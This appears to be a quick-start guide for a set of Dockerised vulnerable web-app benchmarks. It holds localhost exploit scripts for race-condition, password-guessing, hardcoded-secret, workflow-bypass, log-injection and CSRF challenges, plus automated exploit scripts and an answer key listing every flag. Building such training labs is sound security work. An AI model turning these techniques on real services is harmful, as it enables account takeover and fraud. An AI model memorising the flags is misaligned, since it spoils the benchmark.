# Strike7 Benchmarks - Quick Start Guide

## Prerequisites

- Docker and Docker Compose installed
- Python 3.x (for exploit scripts)
- curl (for testing)
- Basic understanding of web security

---

## Quick Test - All Benchmarks

Test all benchmarks in sequence:

```bash
#!/bin/bash

echo "Testing all Strike7 benchmarks..."

benchmarks=(
  "S7BEN-400-01"
  "S7BEN-900-01"
  "S7BEN-200-01"
  "S7BEN-400-02"
  "S7BEN-900-02"
  "S7BEN-100-01"
)

for benchmark in "${benchmarks[@]}"; do
  echo ""
  echo "========================================="
  echo "Testing $benchmark"
  echo "========================================="

  cd "benchmarks/$benchmark" || exit

  # Build and start
  make up

  # Wait a moment
  sleep 2

  # Test health
  if make test; then
    echo "✅ $benchmark is healthy"
  else
    echo "❌ $benchmark health check failed"
  fi

  # Stop
  make down

  cd ../..
done

echo ""
echo "========================================="
echo "All benchmarks tested!"
echo "========================================="
```

Save as `test_all.sh` and run:
```bash
chmod +x test_all.sh
./test_all.sh
```

---

## Individual Benchmark Testing

### S7BEN-400-01: Race Condition

```bash
cd benchmarks/S7BEN-400-01
make up

# Exploit with Python
python3 << 'EOF'
import requests
import threading

URL = "http://localhost:5000"
def withdraw(amt): requests.post(f"{URL}/withdraw", json={"amount": amt})

threads = [threading.Thread(target=withdraw, args=(100,)) for _ in range(5)]
for t in threads: t.start()
for t in threads: t.join()

print(requests.get(f"{URL}/flag").text)
EOF

make down
```

---

### S7BEN-900-01: Insufficient Logging

```bash
cd benchmarks/S7BEN-900-01
make up

# Exploit with Python
python3 << 'EOF'
import requests

passwords = ["password", "admin123", "weakpass123"]
for pwd in passwords:
    r = requests.post("http://localhost:5000/login",
                     data={"username": "admin", "password": pwd},
                     allow_redirects=True)
    if "SBEN{" in r.text:
        print("Flag found:", r.text[r.text.find("SBEN{"):r.text.find("}")+1])
        break
EOF

make down
```

---

### S7BEN-200-01: Hardcoded Secrets

```bash
cd benchmarks/S7BEN-200-01
make up

# Exploit with curl
API_KEY=$(curl -s http://localhost:5000/static/app.js | grep -oP 'API_KEY = "\K[^"]+')
echo "Found API Key: $API_KEY"

curl -s http://localhost:5000/api/secret \
  -H "X-API-Key: $API_KEY" | grep -oP 'SBEN\{[^}]+\}'

make down
```

---

### S7BEN-400-02: Workflow Bypass

```bash
cd benchmarks/S7BEN-400-02
make up

# Exploit with curl
ORDER_ID=$(curl -s -X POST http://localhost:5000/order \
  -H "Content-Type: application/json" \
  -d '{"item":"Widget","price":99.99}' | grep -oP '"order_id":"\K[^"]+')

echo "Created order: $ORDER_ID"

curl -s -X PUT http://localhost:5000/order/$ORDER_ID/status \
  -H "Content-Type: application/json" \
  -d '{"status":"SHIPPED"}' | grep -oP 'SBEN\{[^}]+\}'

make down
```

---

### S7BEN-900-02: Log Injection

```bash
cd benchmarks/S7BEN-900-02
make up

# Exploit with Python
python3 << 'EOF'
import requests

malicious_username = "attacker\nLogin successful - Username: admin, IP: 127.0.0.1"

requests.post("http://localhost:5000/login",
             data={"username": malicious_username, "password": "test"})

r = requests.get("http://localhost:5000/verify")
if "SBEN{" in r.text:
    print("Flag:", r.text[r.text.find("SBEN{"):r.text.find("}")+1])
EOF

make down
```

---

### S7BEN-100-01: CSRF

```bash
cd benchmarks/S7BEN-100-01
make up

# Exploit with Python
python3 << 'EOF'
import requests

session = requests.Session()
session.post("http://localhost:5000/login",
            data={"username": "admin", "password": "admin123"})

session.post("http://localhost:5000/change-password",
            data={"new_password": "hacked", "confirm_password": "hacked"})

r = session.get("http://localhost:5000/dashboard")
print("Flag:", r.text[r.text.find("SBEN{"):r.text.find("}")+1])
EOF

make down
```

---

## One-Liner Flag Extraction

Get all flags quickly:

```bash
# S7BEN-400-01
cd benchmarks/S7BEN-400-01 && make up && sleep 3 && \
  python3 -c "import requests,threading;u='http://localhost:5000';[threading.Thread(target=lambda:requests.post(f'{u}/withdraw',json={'amount':100})).start() for _ in range(5)];import time;time.sleep(1);print(requests.get(f'{u}/flag').text)" && \
  make down && cd ../..

# Add similar one-liners for other benchmarks
```

---

## Troubleshooting

### Port Already in Use
If you get "port already in use" errors:

```bash
# Find and kill process using port 5000
lsof -ti:5000 | xargs kill -9

# Or change port in docker-compose.yml
ports:
  - "5001:5000"  # Use port 5001 instead
```

### Container Won't Start
```bash
# Check logs
cd benchmarks/S7BEN-XXX-XX
docker compose logs app

# Rebuild from scratch
make clean
make build
```

### Health Check Fails
```bash
# Wait longer for service to be ready
make up
sleep 5
make test

# Check if service is actually running
docker compose ps
```

---

## Development Workflow

### Adding a New Benchmark

```bash
# 1. Create directory structure
mkdir -p benchmarks/S7BEN-XXX-XX/app

# 2. Copy templates
cp benchmarks/S7BEN-400-01/Makefile benchmarks/S7BEN-XXX-XX/
cp benchmarks/S7BEN-400-01/docker-compose.yml benchmarks/S7BEN-XXX-XX/
cp benchmarks/S7BEN-400-01/app/Dockerfile benchmarks/S7BEN-XXX-XX/app/

# 3. Customize files
# Edit Makefile, docker-compose.yml, create app.py

# 4. Test
cd benchmarks/S7BEN-XXX-XX
make up
make test
# ... test exploitation ...
make down
make clean
```

---

## Performance Tips

### Parallel Testing
Test multiple benchmarks simultaneously:

```bash
# Terminal 1
cd benchmarks/S7BEN-400-01 && make up

# Terminal 2
cd benchmarks/S7BEN-900-01 && make up

# Terminal 3
cd benchmarks/S7BEN-200-01 && make up

# They use random ports, so no conflicts!
```

### Faster Builds
```bash
# Use BuildKit for parallel builds
export DOCKER_BUILDKIT=1
export COMPOSE_DOCKER_CLI_BUILD=1

make build  # Now much faster!
```

### Cleanup All
```bash
# Stop all benchmarks
for dir in benchmarks/S7BEN-*; do
  (cd "$dir" && make down)
done

# Remove all images
docker rmi $(docker images | grep sben- | awk '{print $3}')
```

---

## Automated Testing Script

Save as `auto_exploit.sh`:

```bash
#!/bin/bash

exploit_benchmark() {
  local benchmark=$1
  echo "Exploiting $benchmark..."

  cd "benchmarks/$benchmark" || return

  case $benchmark in
    "S7BEN-400-01")
      python3 -c "import requests,threading;u='http://localhost:5000';[threading.Thread(target=lambda:requests.post(f'{u}/withdraw',json={'amount':100})).start() for _ in range(5)];import time;time.sleep(2);r=requests.get(f'{u}/flag');print(r.text if 'SBEN{' in r.text else 'Failed')"
      ;;

    "S7BEN-900-01")
      python3 -c "import requests;passwords=['password','admin123','weakpass123'];[print(requests.post('http://localhost:5000/login',data={'username':'admin','password':p},allow_redirects=True).text) for p in passwords if 'SBEN{' in requests.post('http://localhost:5000/login',data={'username':'admin','password':p},allow_redirects=True).text]"
      ;;

    # Add other benchmarks...
  esac

  cd ../..
}

# Start benchmark, exploit, stop
for benchmark in S7BEN-400-01 S7BEN-900-01; do
  cd "benchmarks/$benchmark" && make up && sleep 3 && cd ../..
  exploit_benchmark "$benchmark"
  cd "benchmarks/$benchmark" && make down && cd ../..
done
```

---

## Docker Compose Tips

### View Logs in Real-Time
```bash
cd benchmarks/S7BEN-XXX-XX
docker compose logs -f app
```

### Execute Commands in Container
```bash
docker compose exec app bash
docker compose exec app cat /tmp/app.log
docker compose exec app ps aux
```

### Restart Without Rebuild
```bash
docker compose restart app
```

---

## Summary

### All Flags
```
S7BEN-400-01: SBEN{R4C3_C0ND1T10N_M4ST3R}
S7BEN-900-01: SBEN{L0GG1NG_F41LURE_3XPL01T3D}
S7BEN-200-01: SBEN{H4RDC0D3D_S3CR3TS_4R3_B4D}
S7BEN-400-02: SBEN{W0RKFL0W_BYP4SS_SUCC3SSFUL}
S7BEN-900-02: SBEN{L0G_1NJ3CT10N_MAST3R}
S7BEN-100-01: SBEN{CSRF_ATT4CK_SUCC3SSFUL}
```

### Essential Commands
```bash
make up      # Start benchmark
make test    # Health check
make down    # Stop benchmark
make clean   # Remove everything
```

### Documentation
- Each benchmark has detailed `TESTING.md`
- See `BENCHMARKS_COMPLETED.md` for overview
- Original strategy in your provided document

---

**Happy Hacking! 🔐**

For detailed exploitation guides, see each benchmark's `TESTING.md` file.
